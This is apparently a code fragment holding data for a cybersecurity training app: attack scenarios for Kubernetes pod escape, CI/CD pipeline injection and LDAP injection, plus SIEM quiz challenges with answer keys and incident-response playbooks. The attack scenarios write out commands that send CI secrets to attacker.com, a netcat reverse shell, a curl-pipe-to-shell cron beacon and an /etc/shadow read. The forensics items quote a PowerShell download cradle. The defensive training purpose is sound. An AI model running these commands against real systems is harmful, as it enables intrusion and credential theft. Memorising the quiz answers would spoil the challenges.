+{id:'NK-025',name:'Kubernetes Pod Escape',cat:'Privilege Escalation',diff:4,dur:'65 min',desc:'Exploit a misconfigured privileged pod to escape the container and compromise the underlying node.',tactics:['Privilege Escalation','Lateral Movement'],techs:[{id:'T1611',name:'Escape to Host',desc:'Mount the host filesystem via privileged pod and chroot to gain node-level root access.',cmds:['# Deploy privileged pod\nkubectl apply -f - <<EOF\napiVersion: v1\nkind: Pod\nmetadata: {name: escape-pod}\nspec:\n  containers:\n  - name: evil\n    image: ubuntu\n    securityContext: {privileged: true}\n    volumeMounts:\n    - mountPath: /host\n      name: hostfs\n  volumes:\n  - name: hostfs\n    hostPath: {path: /}\nEOF\n# Chroot to host\nkubectl exec -it escape-pod -- chroot /host /bin/bash\ncat /etc/shadow']},{id:'T1552.007',name:'Container API Keys',desc:'Extract kubelet credentials and API server tokens from the compromised node.',cmds:['# Read node kubeconfig\ncat /etc/kubernetes/admin.conf\n# List all secrets cluster-wide\nkubectl get secrets -A --kubeconfig=/host/etc/kubernetes/admin.conf\n# Dump service account tokens\nkubectl get secret -n kube-system -o yaml | grep "token:"']}],tools:['kubectl','docker','crictl','kube-bench'],defense:['Pod Security Admission — enforce restricted policy','Never run pods with privileged:true','Read-only root filesystem + drop all capabilities','OPA Gatekeeper to block hostPath volume mounts']},
+{id:'NK-026',name:'CI/CD Pipeline Injection',cat:'Execution',diff:4,dur:'60 min',desc:'Inject malicious code into a GitHub Actions workflow to exfiltrate secrets and deploy a backdoor.',tactics:['Execution','Persistence','Credential Access'],techs:[{id:'T1195.002',name:'Compromise Software Supply Chain',desc:'Inject commands into a GitHub Actions YAML to exfiltrate CI secrets to an attacker server.',cmds:["# Malicious PR with workflow injection\n# .github/workflows/test.yml\n- name: Run Tests\n  run: |\n    # Exfil secrets via env var\n    curl https://attacker.com/steal?token=$GITHUB_TOKEN\n    curl https://attacker.com/steal?key=$AWS_SECRET_ACCESS_KEY\n    # Backdoor the built artifact\n    echo 'while true; do nc attacker.com 4444 -e /bin/sh; sleep 60; done &' >> entrypoint.sh",'# Forge commit to bypass branch protection\ngit config user.email "maintainer@project.org"\ngit push origin feature-branch']},{id:'T1053.003',name:'Cron via Pipeline',desc:'Add persistent cron via a pipeline step that ships in the production container image.',cmds:['# In Dockerfile injected step\nRUN echo "*/5 * * * * curl attacker.com/beacon | sh" | crontab -\n# Or schedule via GitHub Actions cron\non:\n  schedule:\n    - cron: "*/15 * * * *"']}],tools:['git','curl','GitHub CLI','truffleHog','Semgrep'],defense:['Pin third-party Actions to full commit SHA','Restrict GITHUB_TOKEN permissions (contents:read only)','Secret scanning on all repos with push protection','Require signed commits and protected branch rules']},
+{id:'NK-027',name:'LDAP Injection → AD Dump',cat:'Credential Access',diff:3,dur:'45 min',desc:'Exploit LDAP injection in a web app login to enumerate and dump Active Directory objects.',tactics:['Initial Access','Discovery','Credential Access'],techs:[{id:'T1190',name:'Exploit Public-Facing Application',desc:'Manipulate LDAP query via login field to bypass auth and enumerate AD users.',cmds:['# Bypass auth with LDAP injection\n# Input: username = *)(uid=*))(&(uid=*\n# Resulting filter: (&(uid=*)(uid=*))(&(uid=*)(pass=test))\ncurl -X POST http://app.corp/login \\\n  -d "user=*)(uid=*))(%26(uid=*&password=anything"\n# Enumerate users via wildcard\ncurl -d "user=a*&password=x" http://app.corp/login\ncurl -d "user=b*&password=x" http://app.corp/login']},{id:'T1087.002',name:'Domain Account Discovery',desc:'Use LDAP queries with ldapsearch to dump all AD users, groups, and computers.',cmds:['# Dump all AD users\nldapsearch -H ldap://dc01.corp.local -x -b "dc=corp,dc=local" \\\n  "(objectClass=user)" sAMAccountName mail memberOf\n# Find admin accounts\nldapsearch -H ldap://dc01.corp.local -x -b "dc=corp,dc=local" \\\n  "(&(objectClass=user)(adminCount=1))" sAMAccountName\n# Enumerate groups\nldapsearch -H ldap://dc01.corp.local -x -b "dc=corp,dc=local" \\\n  "(objectClass=group)" cn member']}],tools:['ldapsearch','Burp Suite','ldapdomaindump','curl'],defense:['Use parameterised LDAP queries — never string concatenation','Disable anonymous LDAP bind on all DCs','WAF rules filtering LDAP metacharacters (* & | ! ( ) )','Restrict LDAP query scope to minimum required OUs']},
+{id:'NK-022',name:'Zero-Day Exploit Chain',cat:'Initial Access',diff:5,dur:'120 min',desc:'Research a CVE, develop a PoC exploit, and chain with privilege escalation.',tactics:['Initial Access','Privilege Escalation','Execution'],techs:[{id:'T1203',name:'Exploitation for Client Execution',desc:'Develop exploit for memory corruption vulnerability, bypass ASLR/DEP/CFG.',cmds:['# Fuzz for crashes\nboofuzz target_app --crash-threshold 1','# Analyse crash\n!analyze -v\n!exploitable','# Build ROP chain\nROPgadget --binary target.exe --rop --chain rop_chain.py','# Test exploit\npython3 exploit.py 192.168.1.100 443']}],tools:['WinDbg','pwntools','ROPgadget','IDA Pro / Ghidra'],defense:['Patch management with SLA urgency','Microsoft Exploit Guard','Control Flow Guard (CFG)','Virtual patching via IPS/WAF']}
+];
+const CHALS=[
+{id:'DC-001',name:'Kerberoasting Alert Triage',type:'siem',pts:150,desc:'Analyse Windows Security event logs and determine if Kerberoasting is occurring.',ev:'[SIEM Alert: Unusual Kerberos TGS Requests]\nTimestamp: 2024-11-14 03:42:17 UTC\nSource: WS-FINANCE-04 (192.168.10.45)\nUser: svc_backup@CORP.LOCAL\n\nEventID 4769 — Service: MSSQLSvc/db-prod-01.corp.local:1433\n  Encryption: 0x17 (RC4-HMAC)\n\nEventID 4769 — Service: HTTP/webapps.corp.local\n  Encryption: 0x17 (RC4-HMAC)\n\n[47 TGS requests in 3 minutes from same account]',q:'What is the strongest combined indicator this is Kerberoasting?',opts:['RC4-HMAC encryption (0x17) alone','Service account requesting unrelated service tickets','47 TGS requests in 3 minutes using RC4 from a low-priv account — all three combined','A legitimate backup service at 03:42 UTC'],ans:2,exp:'All three indicators form an unmistakable Kerberoasting signature: RC4-HMAC (attackers request it for crackable hashes), a low-priv account requesting unrelated service tickets, and 47 requests in 3 minutes (classic Invoke-Kerberoast / Rubeus automated enumeration). Modern systems default to AES — any RC4 TGS request is a red flag.'},
+{id:'DC-002',name:'Suspicious PowerShell',type:'forensics',pts:200,desc:'Examine a PowerShell script block log and identify the malicious techniques.',ev:'[ScriptBlock Log — Event ID 4104]\nHost: WS-DEVOPS-07 | User: j.chen\nTimestamp: 2024-11-15 14:22:03\n\nBlock #1:\n$wc = New-Object Net.WebClient\n$code = $wc.DownloadString(\'http://185.220.101.45/stager.ps1\')\nIEX $code\n\nBlock #2 (decoded):\n$buf = [Byte[]](0xfc,0x48,0x83,0xe4,0xf0,0xe8...)\n$mem = [Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length)\n[Runtime.InteropServices.Marshal]::Copy($buf,0,$mem,$buf.Length)',q:'Which two MITRE ATT&CK techniques are combined here?',opts:['T1566 (Phishing) + T1059 (Scripting)','T1059.001 (PowerShell) + T1055 (Process Injection via shellcode)','T1086 (PowerShell) + T1003 (Credential Dumping)','T1105 (Ingress Transfer) + T1218 (Signed Binary Proxy)'],ans:1,exp:'Block #1 is T1059.001 — IEX downloading and executing a remote script (PowerShell cradle). Block #2 performs in-memory shellcode injection via AllocHGlobal + Marshal.Copy — that is T1055 Process Injection. The byte array 0xfc,0x48,0x83... is a classic Cobalt Strike / Meterpreter shellcode prologue signature.'},
+{id:'DC-003',name:'C2 Beaconing Detection',type:'network',pts:175,desc:'Analyse network flow metadata to identify Command and Control beaconing behaviour.',ev:'[Firewall Flow Log — Host: 10.1.5.33]\nDuration: 6 hours (14:00-20:00)\n\nOutbound to 45.33.32.156:443 (DigitalOcean):\n14:02:33 | 847 bytes | HTTPS\n14:12:35 | 823 bytes | HTTPS\n14:22:37 | 851 bytes | HTTPS\n14:32:38 | 836 bytes | HTTPS\n... [pattern every ~600s = 36 total connections]\n\nProcess: svchost.exe (PID 4892)\nTLS Cert: *.microsoft-update-cdn.com (Self-signed, 2 days old)',q:'What is the PRIMARY behavioural indicator of C2 beaconing?',opts:['Destination IP is DigitalOcean cloud hosting','Self-signed TLS certificate only 2 days old','Regular ~600-second interval with consistent 823-851 byte payloads from svchost','Using HTTPS port 443 for outbound traffic'],ans:2,exp:'The ~600-second beacon interval with near-identical payload sizes is the defining C2 indicator — called jitter-free beaconing. It signals a hardcoded sleep timer in malware. While the self-signed cert and DigitalOcean hosting add confidence, the consistent interval + payload size from a system process is what SIEM correlation rules should trigger on.'},
+{id:'DC-004',name:'Ransomware IR First Steps',type:'ir',pts:250,desc:'Ransomware is actively spreading. Determine the correct immediate response.',ev:'[P1 CRITICAL — Active Ransomware]\nTime: 03:47 UTC\nAlert: 15,000+ files renamed .LOCKED in last 8 minutes\nSource: FS-CORP-01 (file server)\nProcess: svchost.exe -> parent: wscript.exe (anomalous)\nNetwork: SMB lateral spread to 12 hosts detected\nAD: No domain-wide password changes\nBackup: Last backup 22 hours ago (offsite)\nVSS: Shadow copy queries failing',q:'What is the FIRST action the IR team must take right now?',opts:['Image all affected systems before taking any action','Isolate FS-CORP-01 from the network to stop SMB lateral spread','Restore from the 22-hour backup immediately','Run full AV scan to identify and remove the ransomware'],ans:1,exp:'Network isolation of the actively spreading host is priority #1. Ransomware spreading over SMB can encrypt thousands more files per minute — every second expands blast radius. Forensic imaging is important but cannot delay containment. The 22h backup is acceptable loss but becomes useless if 12+ more hosts encrypt. AV scans are too slow and miss novel ransomware. Isolate first, investigate second.'},
+{id:'DC-005',name:'Sigma Rule — Kerberoasting',type:'detection',pts:300,desc:'Identify the correct Sigma detection logic for high-fidelity Kerberoasting detection.',ev:'Sigma Rule Skeleton:\ntitle: Kerberoasting Detection\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: ???\n    TicketEncryptionType: ???\n    ServiceName|not|endswith: ???\n  timeframe: 5m\n  condition: selection | count() by AccountName > ???\nlevel: high',q:'Which field combination gives accurate Kerberoasting detection with minimal false positives?',opts:['EventID: 4769 AND EncryptionType: 0x17','EventID: 4769 AND EncryptionType: 0x17 AND ServiceName NOT ending $ AND count > 5 in 5min','EventID: 4769 AND ServiceName contains MSSQLSvc','Any EventID 4769 from non-admin accounts'],ans:1,exp:'Optimal Sigma: EventID 4769 (Kerberos TGS request) + EncryptionType 0x17 (RC4-HMAC — modern systems use AES 0x12) + ServiceName NOT ending in $ (filters normal machine account tickets) + frequency threshold (>5 in 5min to reduce noise). This multi-condition approach achieves high fidelity detection.'},
+{id:'DC-006',name:'Firewall Log Exfiltration',type:'network',pts:175,desc:'Review firewall egress logs to identify data exfiltration in progress.',ev:'[Firewall Egress — Last 2 Hours]\n\n10.5.2.88 -> 104.21.3.45:443 | 2.3 MB | 180s\n10.5.2.88 -> 104.21.3.45:443 | 2.1 MB | 175s\n10.5.2.88 -> 104.21.3.45:443 | 2.4 MB | 182s\n... [8 transfers = ~18MB total]\n\nDomain: backup-sync-cdn.com (Cloudflare)\nDomain registered: 3 days ago\nPrior traffic: NONE\nHost: HR workstation, normal baseline <500KB/hr',q:'What combination most strongly indicates exfiltration?',opts:['The destination is Cloudflare-hosted','Domain 3 days old + zero prior traffic + volume 36x above baseline','The transfers are consistent 2.2-2.4MB chunks','Using HTTPS port 443'],ans:1,exp:'Three key exfil indicators: (1) 3-day domain age — attackers register fresh domains to avoid reputation blacklists; (2) Zero prior traffic history — legitimate backup tools show historical patterns; (3) 36x volume above HR workstation baseline — a major UEBA anomaly. Combined: high-confidence exfiltration alert.'},
+{id:'DC-007',name:'AWS CloudTrail Investigation',type:'forensics',pts:225,desc:'Investigate suspicious CloudTrail activity to determine scope of a cloud account compromise.',ev:'[CloudTrail Log — Account 123456789012]\n01:04:22 | GetCallerIdentity | iam-readonly-user | 185.220.101.45\n01:04:45 | ListUsers         | iam-readonly-user\n01:05:33 | ListRoles         | iam-readonly-user\n01:08:17 | AssumeRole -> DataScienceRole | iam-readonly-user | SUCCESS\n01:11:02 | GetObject s3://corp-sensitive/payroll_2024.xlsx | DataScienceRole\n01:11:18 | GetObject s3://corp-sensitive/strategy_2025.pdf | DataScienceRole\n01:44:22 | AttachUserPolicy AdministratorAccess | DataScienceRole | DENIED',q:'Which attack phase does the AssumeRole action at 01:08:17 represent?',opts:['Initial Access — attacker gains first entry','Privilege Escalation — using role assumption for broader permissions','Lateral Movement — moving between cloud services','Defense Evasion — hiding via legitimate AWS API'],ans:1,exp:'AssumeRole is a Privilege Escalation technique (T1078.004). Attacker started with iam-readonly-user (low privilege) and assumed DataScienceRole, escalating to S3 read access. The subsequent DENIED on AttachUserPolicy shows blocked further escalation to AdminAccess. Full chain: Enumeration -> Role Escalation -> Data Access -> Blocked Admin Escalation.'},
+{id:'DC-009',name:'Kubernetes API Anomaly',type:'forensics',pts:225,desc:'Investigate unusual Kubernetes API activity to determine if a service account has been compromised.',ev:'[K8s Audit Log — Namespace: prod]\nTimestamp: 2024-11-17 22:11:04 UTC\nUser: system:serviceaccount:default:app-service\n\n22:11:04 | GET  /api/v1/secrets | ALL namespaces | 200\n22:11:07 | GET  /api/v1/namespaces/kube-system/secrets | 200\n22:11:09 | POST /api/v1/namespaces/prod/pods | privileged:true | 200\n22:11:44 | PATCH /apis/rbac.../clusterroles/cluster-admin | 200\n\nBaseline: This SA normally only GETs /api/v1/namespaces/prod/configmaps\nPod created from: ubuntu:latest (external registry)',q:'Which action is the strongest indicator of cluster compromise and privilege escalation?',opts:['Reading secrets from the default namespace','Listing secrets across all namespaces','Creating a privileged pod + patching cluster-admin role — cluster takeover confirmed','Using a service account to access the API'],ans:2,exp:'The combined actions confirm full cluster compromise: (1) Cross-namespace secret enumeration (far beyond SA scope); (2) Privileged pod creation from an external image (T1611 escape vector); (3) Patching cluster-admin ClusterRole — a direct privilege escalation to cluster-wide root. This is a textbook Kubernetes cluster takeover sequence. The SA token was likely stolen from a compromised pod.'},
+{id:'DC-010',name:'OAuth Consent Phishing',type:'siem',pts:200,desc:'Review Entra ID (Azure AD) logs to identify an OAuth app used for phishing and email collection.',ev:'[Entra ID Audit Log — 2024-11-18]\n14:02 | App registered: "SharePoint-Sync-Util" | actor: external\n14:05 | OAuth2PermissionGrant | User: c.davies@corp.com\n       Scopes: Mail.Read, Files.ReadWrite.All, offline_access\n14:06 | OAuth2PermissionGrant | User: m.patel@corp.com  \n       Scopes: Mail.Read, Files.ReadWrite.All, offline_access\n14:07 | OAuth2PermissionGrant | User: j.smith@corp.com\n       Scopes: Mail.Read, Files.ReadWrite.All, offline_access\n\n[Sign-in Log]\n14:08 | App: SharePoint-Sync-Util\n       IPs: 185.220.101.34, 185.220.101.35 (Tor exit nodes)\n       Accessed: /v1.0/me/messages [3 users] | 847 emails read',q:'What is the primary attack vector and why is offline_access critical to the attacker?',opts:['The attacker registered an app to bypass MFA','OAuth phishing — offline_access gives a refresh token enabling persistent access without re-authentication','The permissions Mail.Read is the only dangerous scope here','The app uses Tor which is always malicious'],ans:1,exp:'This is a classic OAuth consent phishing / illicit consent grant (T1528). The killer scope is offline_access — it grants a refresh token, meaning the attacker retains persistent email access indefinitely, even after password reset (tokens must be explicitly revoked). Three users consented within 90 seconds — targeted phishing email with fake SharePoint link. The Tor exit node confirms malicious origin.'},
+{id:'DC-011',name:'WMI Lateral Movement',type:'forensics',pts:200,desc:'Identify WMI-based lateral movement from Sysmon and Windows event logs.',ev:'[Sysmon + Security Event Log — SRV-APP-02]\n\nEvent ID 4648 (Explicit Credential Use):\n  Account: CORP\\j.adams (standard user)\n  Target Server: SRV-DB-01.corp.local\n  Process: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\n\nSysmon Event 3 (Network Connection):\n  Process: WmiPrvSE.exe\n  Dst: 10.10.5.22:135 (SRV-DB-01)\n\nSysmon Event 1 (Process Create — on SRV-DB-01):\n  ParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\n  CommandLine: powershell -nop -enc SQBFAFgA...\n  User: CORP\\j.adams\n\nBaseline: j.adams never accesses SRV-DB-01',q:'What technique does this represent and what is the key forensic indicator?',opts:['T1059 (Command Execution) — PowerShell encoded command','T1021.006 (WMI Remote) — WmiPrvSE.exe as parent of PowerShell on a remote host is definitive WMI lateral movement','T1078 (Valid Accounts) — using j.adams credentials','T1003 (Credential Dumping) — the encoded PowerShell dumps credentials'],ans:1,exp:'WmiPrvSE.exe spawning PowerShell on a remote host (SRV-DB-01) where the parent account (j.adams) has no baseline activity is the definitive WMI lateral movement indicator (T1021.006). Attackers use WMI for remote execution because it produces minimal noise vs PSExec. The encoded PowerShell (-enc) is an evasion attempt. Event 4648 with WmiPrvSE.exe confirms explicit credential use over WMI. Alert on WmiPrvSE.exe spawning any child process remotely.'},
+{id:'DC-012',name:'CI/CD Secret Exposure',type:'detection',pts:275,desc:'Identify a GitHub Actions secret exposure in build logs and determine blast radius.',ev:'[GitHub Actions Log — Repo: corp/backend-api]\nRun: #4821 | Branch: feature/new-auth | PR from: external fork\n\nStep: Run Tests\n  ...\n  + curl -H "Authorization: Bearer ghp_xK9mN2..." https://api.github.com/user\n  Login: corp-deploy-bot\n  Repos: 47 private repositories\n\nStep: Deploy to Staging  \n  + AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n  + AWS_SECRET_ACCESS_KEY=wJalrXUtn...\n  Uploading to s3://corp-prod-artifacts/\n\n[Immediately after — CloudTrail]\n  23:01 | ListBuckets | AKIAIOSFODNN7 | 45.9.148.125 (Russia/VPN)\n  23:01 | GetObject s3://corp-prod-artifacts/api-v2.tar.gz',q:'What is the highest-priority immediate action upon discovering this exposure?',opts:['Rotate the AWS keys and GitHub token within minutes — both are already in active use','Delete the GitHub Actions log to prevent further exposure','Revoke the PR from the external fork','Notify the developer whose PR caused the leak'],ans:0,exp:'Both secrets are already in active use (CloudTrail confirms within minutes). The FIRST action is rotating both the GitHub token (ghp_xK9mN2...) and AWS access keys immediately — attacker already has S3 access to production artifacts. Second: revoke the GitHub token via GitHub Settings, invalidate AWS key via IAM console, then review what the attacker accessed/exfiltrated. Log deletion is evidence destruction and counterproductive. Root cause: secrets in env vars printed to logs — fix with secret masking and repo scanning with push protection.'},
+{id:'DC-013',name:'Password Spray Detection',type:'siem',pts:175,desc:'Distinguish a password spray attack from legitimate brute force lockouts using Windows event logs.',ev:'[Active Directory — Event ID 4625 (Failed Logons)]\nTime Window: 06:00-06:15 UTC\n\nAccount: a.johnson  | Failures: 2 | Source IPs: 85.195.x.x, 85.196.x.x\nAccount: b.martinez | Failures: 2 | Source IPs: 85.195.x.x, 85.196.x.x\nAccount: c.thompson | Failures: 2 | Source IPs: 85.195.x.x, 85.196.x.x\n... [67 accounts, each with 1-2 failures]\n\nCompare to lockout policy: Lock after 5 failures\nLockouts triggered: 0\n\n[Auth log at 06:17]\nAccount: m.chen | Source: 85.195.x.x | SUCCESS\nLast password set: 847 days ago',q:'What distinguishes this as a password spray (not brute force) and what is the critical finding?',opts:['Many failures across many accounts — that is brute force by definition','2 attempts per account across 67 accounts avoids lockout threshold — spray. Critical: m.chen authenticated = spray succeeded with a stale password','The external IP range indicates a nation-state attack','No lockouts mean the attack failed'],ans:1,exp:'Password spray signature: few attempts per account (2 vs 5 lockout threshold — deliberate) distributed across many accounts. Brute force would target one account with many attempts and trigger lockout. CRITICAL FINDING: m.chen authenticated at 06:17 from the same IP block — the spray succeeded. The 847-day-old password is the vulnerability (weak rotation policy). Immediate actions: lock m.chen, force org-wide MFA, reset all accounts with passwords >180 days.'},
+{id:'DC-008',name:'UEBA Insider Threat',type:'forensics',pts:200,desc:'Review UEBA anomalies to determine if an insider threat is exfiltrating data.',ev:'[UEBA Alert — User: m.thomas (Finance Analyst)]\nBaseline: 45 files/day avg (90-day window)\n\nAnomaly: 2024-11-16 (Saturday 11pm)\nFiles accessed: 847 in 3 hours\nFiles: payroll_all_2024.xlsx, M&A_target_list.pdf,\n       executive_compensation.xlsx, org_restructure_draft.pdf\n\nUSB: Device inserted 11:34pm\nBaseline USB activity: NONE (never in 90 days)\n\nContext: Employee received redundancy notice 3 days ago',q:'Which single factor makes this the highest-confidence insider threat indicator?',opts:['Working at 11pm on a Saturday','Accessing 847 files vs 45/day baseline (18x anomaly)','Zero historical USB use combined with redundancy notice context and 18x file anomaly','Accessing payroll and M&A files'],ans:2,exp:'The highest-confidence indicator is the combination: zero historical USB use (100% anomaly) occurring days after a redundancy notice (clear motive). The 18x file access anomaly and sensitive file categories compound confidence. UEBA scores this as critical because motive (redundancy), method (USB), and behaviour anomaly (18x baseline) align perfectly — classic opportunistic insider threat pattern.'}
+];
+const IR_PB=[
+{id:'IR-001',name:'Ransomware Response',ph:'Incident Response',desc:'5-phase playbook for containing and recovering from an active ransomware incident.',phases:{Preparation:['Verify offline backups exist and are tested','Confirm IR team contacts are reachable','Ensure EDR/SIEM dashboards are accessible','Have isolation runbooks ready'],Detection:['Confirm mass file encryption via EDR telemetry','Identify patient-zero host','Determine ransomware family from extension/ransom note','Check VSS shadow copy status immediately'],Containment:['Isolate infected hosts from network immediately','Block SMB (445) between subnets','Disable compromised service accounts in AD','Capture memory dump before rebooting infected hosts'],Eradication:['Remove ransomware binary and persistence mechanisms','Reset all service account passwords','Patch exploited vulnerability if known','Rebuild infected systems from clean images'],Recovery:['Restore from last known good backup','Validate restored data integrity','Re-enable isolated systems after clean verification','Document full timeline for post-incident report']},snort:'alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Ransomware C2 Beacon"; content:"README_DECRYPT"; nocase; sid:9000001; rev:1;)',sigma:'detection:\n  selection:\n    EventID: 4663\n    ObjectType: File\n    AccessMask: 0x2\n  condition: selection | count(ObjectName) by SubjectUserName > 500\ntimeframe: 5m\nlevel: critical'},
+{id:'IR-002',name:'Kerberoasting Response',ph:'Identity Threat Response',desc:'Detect, contain, and remediate a Kerberoasting attack targeting service account credentials.',phases:{Preparation:['Identify all accounts with SPNs in AD','Audit service account password ages','Enable Event 4769 logging with encryption type filtering','Baseline TGS request volumes per user'],Detection:['Alert on RC4-HMAC TGS requests (EncryptionType 0x17)','Identify source account and workstation','Review frequency — >5 requests/5min is suspicious','Check if new SPNs were recently registered'],Containment:['Disable or quarantine source workstation','Reset targeted service account passwords immediately','Enable AES-only Kerberos (disable RC4)','Block source IP in firewall'],Eradication:['Rotate all service account passwords (25+ chars)','Migrate to Group Managed Service Accounts (gMSA)','Remove unnecessary SPNs','Audit AD for other misconfigured service accounts'],Recovery:['Verify service continuity after password rotation','Update monitoring baselines for TGS activity','Implement PAM solution for service accounts','Schedule quarterly SPN audit']},snort:'alert udp $HOME_NET any -> $HOME_NET 88 (msg:"Kerberoasting Mass TGS Request"; threshold:type both,track by_src,count 10,seconds 60; sid:9000002; rev:1;)',sigma:'detection:\n  selection:\n    EventID: 4769\n    TicketEncryptionType: \'0x17\'\n    ServiceName|not|endswith: \'$\'\n  condition: selection | count() by AccountName > 5\ntimeframe: 5m\nlevel: high'},
+{id:'IR-003',name:'Data Exfiltration Response',ph:'Data Breach Response',desc:'Investigate and contain a suspected data exfiltration through cloud storage or USB.',phases:{Preparation:['Confirm DLP solution coverage and alerting','Identify data classification of affected repositories','Have legal/compliance contact on standby','Prepare forensic tools and chain of custody process'],Detection:['Identify what data was accessed and copied','Determine exfiltration vector (cloud/USB/email)','Calculate total data volume exfiltrated','Establish full timeline from UEBA and DLP logs'],Containment:['Disable user account and revoke active sessions','Block outbound connections to identified cloud storage','Confiscate USB device if physical theft','Preserve evidence — do not delete logs'],Eradication:['Revoke all API tokens and OAuth grants','Remove malicious scripts or tools from system','Notify data owners of breach scope','Assess if credentials were also exfiltrated'],Recovery:['Reinstate access with enhanced monitoring if cleared','Deploy additional DLP rules for detected patterns','Conduct security awareness training','Tighten cloud access policies via CASB']},snort:'alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"Large Outbound Upload"; dsize:>50000; threshold:type both,track by_src,count 5,seconds 300; sid:9000003; rev:1;)',sigma:'detection:\n  selection:\n    EventID: 4663\n    ObjectName|contains:\n      - \'payroll\'\n      - \'confidential\'\n      - \'M&A\'\n  condition: selection | count() by SubjectUserName > 20\ntimeframe: 1h\nlevel: high'},
+{id:'IR-004',name:'Lateral Movement Response',ph:'Active Intrusion Response',desc:'Detect and halt attacker lateral movement across Windows infrastructure.',phases:{Preparation:['Ensure Sysmon is deployed with lateral movement rules','Enable PowerShell script block logging','Confirm SIEM has network logon (Event 4624 Type 3) alerts','Map critical assets and high-value targets'],Detection:['Alert on Event 4624 Type 3 from unusual sources','Detect NTLM auth to multiple hosts in short window','Monitor for remote service creation (Event 7045)','Identify originating compromised account'],Containment:['Reset compromised account and revoke Kerberos tickets','Isolate source and destination hosts','Block NTLM authentication temporarily','Disable compromised service or account'],Eradication:['Remove attacker persistence (tasks, registry, services)','Rotate passwords for all accounts touched by attacker','Audit all hosts the attacker reached','Identify and close initial access vector'],Recovery:['Restore isolated hosts after forensic investigation','Re-enable NTLM with monitoring if needed','Deploy Credential Guard on all Windows 10+ hosts','Implement PAW for administrator access']},snort:'alert tcp $HOME_NET 445 -> $HOME_NET 445 (msg:"SMB Lateral Movement PsExec"; content:"|FF|SMBr"; content:"PSEXESVC"; distance:0; sid:9000004; rev:1;)',sigma:'detection:\n  selection:\n    EventID: 4624\n    LogonType: 3\n    AuthenticationPackageName: NTLM\n  filter:\n    SubjectUserName|endswith: \'$\'\n  condition: selection and not filter | count() by IpAddress > 10\ntimeframe: 10m\nlevel: high'},
+{id:'IR-006',name:'Supply Chain Compromise',ph:'Software Supply Chain Response',desc:'Respond to a compromised npm package or CI/CD pipeline used to backdoor production builds.',phases:{Preparation:['Maintain SBOM (Software Bill of Materials) for all dependencies','Configure repository secret scanning with push protection','Ensure all CI/CD pipelines pin action versions to commit SHA','Have emergency rollback procedure for all production deployments'],Detection:['Alert on new packages added to package.json / requirements.txt','Monitor for unexpected outbound connections from build agents','Review package audit logs — npm audit / pip-audit','Check CI/CD logs for exposed credentials or unexpected commands'],Containment:['Halt all CI/CD pipeline runs immediately','Pin all dependencies to known-good versions in lockfile','Revoke all tokens and secrets used in affected pipelines','Quarantine and preserve affected build artifacts for forensics'],Eradication:['Identify and remove malicious package or pipeline step','Rotate all secrets exposed in build logs','Purge and rebuild all build caches from scratch','Audit all repositories for injected code or modified workflows'],Recovery:['Rebuild production from verified clean source and lockfile','Re-validate artifacts with checksum and signature verification','Deploy with enhanced monitoring for anomalous outbound connections','Implement mandatory code review for all workflow YAML changes']},snort:'alert tcp $BUILD_NET any -> $EXTERNAL_NET any (msg:"Build Agent Unexpected Outbound"; dest_port:!443,80; sid:9000006; rev:1;)',sigma:'detection:\n  selection:\n    EventType: process_creation\n    Image|endswith:\n      - "\\\\node.exe"\n      - "\\\\python.exe"\n    CommandLine|contains:\n      - "curl"\n      - "wget"\n      - "Invoke-WebRequest"\n  condition: selection\nlevel: high'},
+{id:'IR-007',name:'Business Email Compromise',ph:'BEC / CEO Fraud Response',desc:'Investigate and contain a Business Email Compromise (BEC) attack involving fraudulent wire transfer requests.',phases:{Preparation:['Enable email authentication — SPF, DKIM, DMARC (p=reject)','Configure anti-impersonation policies in mail gateway','Define wire transfer verification procedures (callback to known number)','Train finance team on BEC red flags — urgency, secrecy, payment changes'],Detection:['Alert on inbox rules forwarding mail to external addresses','Detect display-name spoofing of executives in email headers','Review mail gateway logs for lookalike domain sending','Monitor finance systems for payment instruction changes'],Containment:['Disable compromised mailbox and revoke all active sessions','Block the sending domain and IP at mail gateway','Alert finance/AP team to halt any pending transfers','Notify bank immediately if wire was sent — recall may be possible within 72h'],Eradication:['Remove inbox rules and mail forwarding set by attacker','Audit OAuth app consents on compromised account','Revoke all refresh tokens and access tokens (use MS DART / AAD revocation)','Identify and reset all accounts the attacker accessed'],Recovery:['Re-enable account with MFA enforced','Deploy conditional access requiring compliant device','Implement dual-approval for all wire transfers above threshold','File FBI IC3 and FinCEN SARs within 72 hours if funds transferred']},snort:'# BEC is email-layer — use mail gateway + SIEM correlation\n# Alert: inbox rule created + external forward + finance keywords',sigma:'detection:\n  selection:\n    EventID: 4648\n    TargetUserName|contains: "finance"\n  filter:\n    IpAddress|cidr: "10.0.0.0/8"\n  condition: selection and not filter\nlevel: high'}
+,{id:'IR-005',name:'Cloud Account Compromise',ph:'Cloud Incident Response',desc:'Respond to a compromised AWS IAM key used for unauthorised access and privilege escalation.',phases:{Preparation:['Ensure CloudTrail is enabled in all regions','Confirm GuardDuty is active','Have IAM break-glass procedure documented','Identify all critical IAM roles and trust policies'],Detection:['Review CloudTrail for GetCallerIdentity from unknown IPs','Alert on AssumeRole from unusual source/time','Monitor for IAM policy modifications','Check for new access keys or users created'],Containment:['Deactivate compromised IAM access key immediately','Revoke all active sessions for compromised identity','Apply emergency deny policy on affected account','Block attacker IPs in WAF / Security Groups'],Eradication:['Delete compromised access key','Audit and remove resources created by attacker','Review and revoke OAuth tokens and role sessions','Rotate all access keys for affected accounts'],Recovery:['Issue new access keys with MFA enforcement','Implement IAM Access Analyzer findings remediation','Enable SCP (Service Control Policies) to restrict blast radius','Add CloudWatch alarms for high-risk API calls']},snort:'# Cloud events not via Snort — use CloudTrail + GuardDuty\n# GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration',sigma:'detection:\n  selection:\n    eventSource: iam.amazonaws.com\n    eventName:\n      - AttachUserPolicy\n      - CreateAccessKey\n      - CreateLoginProfile\n  condition: selection\nlevel: critical'}
+];
+const TACTICS=[
+{t:'Reconnaissance',c:'#00ffff',techs:['Active Scanning','OSINT','Phishing for Info']},
+{t:'Initial Access',c:'#ff3055',techs:['Phishing','Exploit Public App','Supply Chain','Valid Accounts']},
